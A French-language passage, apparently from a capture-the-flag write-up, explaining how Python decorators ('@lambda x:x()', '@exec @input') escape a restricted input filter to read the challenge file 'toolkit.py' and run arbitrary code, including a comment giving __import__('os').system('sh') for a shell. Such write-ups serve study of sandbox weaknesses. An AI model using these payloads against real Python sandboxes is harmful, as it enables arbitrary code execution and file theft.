Dans les caractères admis pour débuter une ligne, on aperçoit la présence de "@"

Les @ en Python représentent les décorateurs. Ils permettent d'appliquer une fonction à une autre.
Exemple:
```python
@print
def x():
	pass
```
```
<function x at 0x0000029C4C34F3A0>
```

Les décorateurs sont appliqués lors de la compilation, ce qui est très intéressant pour nous!
Cela permet d'executer du code sans avoir recours à l'appel d'une fonction de manière traditionnel.

Il y a de nombreux *payloads* possibles à partir de là.

Nous pouvons executer la fonction directement:
```python
@lambda x:x()    # Fonction anonyme qui fait simplement l'appel de la fonction
def payload():
	print("mouahahahah >:)")
	# On peut faire tout ce qu'on veut
	with open("toolkit.py","r") as f:
		print(f.read())
```

Nous pouvons aussi avoir une execution de code Python arbitraire:
```python
# Payload très connue, trouvable sur Hacktricks notamment
@exec
@input
def x():
	pass
```
```
<function x at 0x0000029C4C34F3A0>print("mouahahahahaha") # __import__('os').system('sh') pour avoir un shell
```
mouahahahahaha
```